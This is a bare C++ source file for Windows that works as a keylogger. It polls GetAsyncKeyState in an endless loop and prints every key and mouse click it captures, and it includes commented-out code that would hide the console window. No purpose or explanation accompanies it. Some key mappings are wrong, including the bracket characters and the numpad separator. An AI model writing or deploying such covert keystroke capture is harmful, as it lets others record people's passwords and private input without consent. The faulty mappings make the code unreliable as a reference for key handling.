#include <iostream>
#include <windows.h>
#include <conio.h>
#include <wtypes.h>

using namespace std;

int main() {
	/*HWND window;
	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(window, 0);
	*/
	while (true) {
		if (GetAsyncKeyState(0x01) == -32767) {
			cout << " \"LCLICK\" ";
		} else if (GetAsyncKeyState(0x02) == -32767) {
			cout << " \"RCLICK\" ";
		} else if (GetAsyncKeyState(0x04) == -32767) {
			cout << " \"MCLICK\" ";
		} else if (GetAsyncKeyState(0x05) == -32767) {
			cout << " \"X1MOUSE\" ";
		} else if (GetAsyncKeyState(0x06) == -32767) {
			cout << " \"X2MOUSE\" ";
		} else if (GetAsyncKeyState(0x08) == -32767) {
			cout << " \"BACKSPACE\" ";
		} else if (GetAsyncKeyState(0x09) == -32767) {
			cout << " \"TAB\" ";
		} else if (GetAsyncKeyState(0x0D) == -32767) {
			cout << " \"ENTER\" ";
		} else if (GetAsyncKeyState(0x12) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << " \"ALT + SHIFT\" ";
			} else {
				cout << " \"ALT\" ";
			}
		} else if (GetAsyncKeyState(0x13) == -32767) {
			cout << " \"PAUSE\" ";
		} else if (GetAsyncKeyState(0x14) == -32767) {
			cout << " \"CAPS LOCK\" ";
		} else if (GetAsyncKeyState(0x20) == -32767) {
			cout << " ";
		} else if (GetAsyncKeyState(0x2E) == -32767) {
			cout << " \"DEL\" ";
		} else if (GetAsyncKeyState(0x24) == -32767) {
			cout << " \"HOME\" ";
		} else if (GetAsyncKeyState(0x25) == -32767) {
			cout << " \"LEFT-ARROW\" ";
		} else if (GetAsyncKeyState(0x26) == -32767) {
			cout << " \"UP-ARROW\" ";
		} else if (GetAsyncKeyState(0x27) == -32767) {
			cout << " \"RIGHT-ARROW\" ";
		} else if (GetAsyncKeyState(0x28) == -32767) {
			cout << " \"DOWN-ARROW\" ";
		} else if (GetAsyncKeyState(0x29) == -32767) {
			cout << " \"SELECT\" ";
		} else if (GetAsyncKeyState(0x30) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << ")";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + 0\" ";
			} else {
				cout << "0";
			}
		} else if (GetAsyncKeyState(0x31) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << "!";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + 1\" ";
			} else {
				cout << "1";
			}
		} else if (GetAsyncKeyState(0x32) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << "@";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + 2\" ";
			} else {
				cout << "2";
			}
		} else if (GetAsyncKeyState(0x33) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << "#";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + 3\" ";
			} else {
				cout << "3";
			}
		} else if (GetAsyncKeyState(0x34) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << "$";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + 4\" ";
			} else {
				cout << "4";
			}
		} else if (GetAsyncKeyState(0x35) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << "%";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + 5\" ";
			} else {
				cout << "5";
			}
		} else if (GetAsyncKeyState(0x36) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << "^";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + 6\" ";
			} else {
				cout << "6";
			}
		} else if (GetAsyncKeyState(0x37) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << "&";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + 7\" ";
			} else {
				cout << "7";
			}
		} else if (GetAsyncKeyState(0x38) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << "*";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + 8\" ";
			} else {
				cout << "8";
			}
		} else if (GetAsyncKeyState(0x39) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << "(";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + 9\" ";
			} else {
				cout << "9";
			}
		} else if (GetAsyncKeyState(0x40) == -32767) {
			cout << " \"UNDEFINED\" ";
		} else if (GetAsyncKeyState(0x41) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << " \"SHIFT + A\" ";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + A\" ";
			} else {
				cout << "A";
			}
		} else if (GetAsyncKeyState(0x42) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << " \"SHIFT + B\" ";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + B\" ";
			} else {
				cout << "B";
			}
		} else if (GetAsyncKeyState(0x43) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << " \"SHIFT + C\" ";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + C\" ";
			} else {
				cout << "C";
			}
		} else if (GetAsyncKeyState(0x44) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << " \"SHIFT + D\" ";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + D\" ";
			} else {
				cout << "D";
			}
		} else if (GetAsyncKeyState(0x45) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << " \"SHIFT + E\" ";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + E\" ";
			} else {
				cout << "E";
			}
		} else if (GetAsyncKeyState(0x46) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << " \"SHIFT + F\" ";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + F\" ";
			} else {
				cout << "F";
			}
		} else if (GetAsyncKeyState(0x47) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << " \"SHIFT + G\" ";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + G\" ";
			} else {
				cout << "G";
			}
		} else if (GetAsyncKeyState(0x48) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << " \"SHIFT + H\" ";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + H\" ";
			} else {
				cout << "H";
			}
		} else if (GetAsyncKeyState(0x49) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << " \"SHIFT + I\" ";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + I\" ";
			} else {
				cout << "I";
			}
		} else if (GetAsyncKeyState(0x4A) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << " \"SHIFT + J\" ";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + J\" ";
			} else {
				cout << "J";
			}
		} else if (GetAsyncKeyState(0x4B) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << " \"SHIFT + K\" ";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + K\" ";
			} else {
				cout << "K";
			}
		} else if (GetAsyncKeyState(0x4C) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << " \"SHIFT + L\" ";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + L\" ";
			} else {
				cout << "L";
			}
		} else if (GetAsyncKeyState(0x4D) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << " \"SHIFT + M\" ";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + M\" ";
			} else {
				cout << "M";
			}
		} else if (GetAsyncKeyState(0x4E) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << " \"SHIFT + N\" ";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + N\" ";
			} else {
				cout << "N";
			}
		} else if (GetAsyncKeyState(0x4F) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << " \"SHIFT + O\" ";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + O\" ";
			} else {
				cout << "O";
			}
		} else if (GetAsyncKeyState(0x50) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << " \"SHIFT + P\" ";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + P\" ";
			} else {
				cout << "P";
			}
		} else if (GetAsyncKeyState(0x51) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << " \"SHIFT + Q\" ";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + Q\" ";
			} else {
				cout << "Q";
			}
		} else if (GetAsyncKeyState(0x52) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << " \"SHIFT + R\" ";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + R\" ";
			} else {
				cout << "R";
			}
		} else if (GetAsyncKeyState(0x53) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << " \"SHIFT + S\" ";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + S\" ";
			} else {
				cout << "S";
			}
		} else if (GetAsyncKeyState(0x54) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << " \"SHIFT +T \" ";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + T\" ";
			} else {
				cout << "T";
			}
		} else if (GetAsyncKeyState(0x55) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << " \"SHIFT + U\" ";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + U\" ";
			} else {
				cout << "U";
			}
		} else if (GetAsyncKeyState(0x56) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << " \"SHIFT + V\" ";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + V\" ";
			} else {
				cout << "V";
			}
		} else if (GetAsyncKeyState(0x57) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << " \"SHIFT + W\" ";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + W\" ";
			} else {
				cout << "W";
			}
		} else if (GetAsyncKeyState(0x58) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << " \"SHIFT + X\" ";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + X\" ";
			} else {
				cout << "X";
			}
		} else if (GetAsyncKeyState(0x59) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << " \"SHIFT + Y\" ";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + Y\" ";
			} else {
				cout << "Y";
			}
		} else if (GetAsyncKeyState(0x5A) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << " \"SHIFT + Z\" ";
			} else if (GetAsyncKeyState(0x11)) {
				cout << " \"CTRL + Z\" ";
			} else {
				cout << "Z";
			}
		} else if (GetAsyncKeyState(0x60) == -32767) {
			cout << "0";
		} else if (GetAsyncKeyState(0x61) == -32767) {
			cout << "1";
		} else if (GetAsyncKeyState(0x62) == -32767) {
			cout << "2";
		} else if (GetAsyncKeyState(0x63) == -32767) {
			cout << "3";
		} else if (GetAsyncKeyState(0x64) == -32767) {
			cout << "4";
		} else if (GetAsyncKeyState(0x65) == -32767) {
			cout << "5";
		} else if (GetAsyncKeyState(0x66) == -32767) {
			cout << "6";
		} else if (GetAsyncKeyState(0x67) == -32767) {
			cout << "7";
		} else if (GetAsyncKeyState(0x68) == -32767) {
			cout << "8";
		} else if (GetAsyncKeyState(0x69) == -32767) {
			cout << "9";
		} else if (GetAsyncKeyState(0xBB) == -32767) {
			cout << "+";
		} else if (GetAsyncKeyState(0x6C) == -32767) {
			cout << "|";
		} else if (GetAsyncKeyState(0xBD) == -32767) {
			cout << "-";
		} else if (GetAsyncKeyState(0xBC) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << "<";
			} else {
				cout << ",";
			}
		} else if (GetAsyncKeyState(0xBE) == -32767) {
			cout << ".";
		} else if (GetAsyncKeyState(0xC0) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << "~";
			} else {
				cout << "`";
			}
		} else if (GetAsyncKeyState(0xBF) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << "?";
			} else {
				cout << "/";
			}
		} else if (GetAsyncKeyState(0xDB) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << "{";
			} else {
				cout << "/[";
			}
		} else if (GetAsyncKeyState(0xDD) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << "]";
			} else {
				cout << "}";
			}
		} else if (GetAsyncKeyState(0xDC) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << "|";
			} else {
				cout << "\\";
			}
		} else if (GetAsyncKeyState(0xDE) == -32767) {
			if (GetAsyncKeyState(0x10)) {
				cout << "\"";
			} else {
				cout << "'";
			}
		}
	}
}

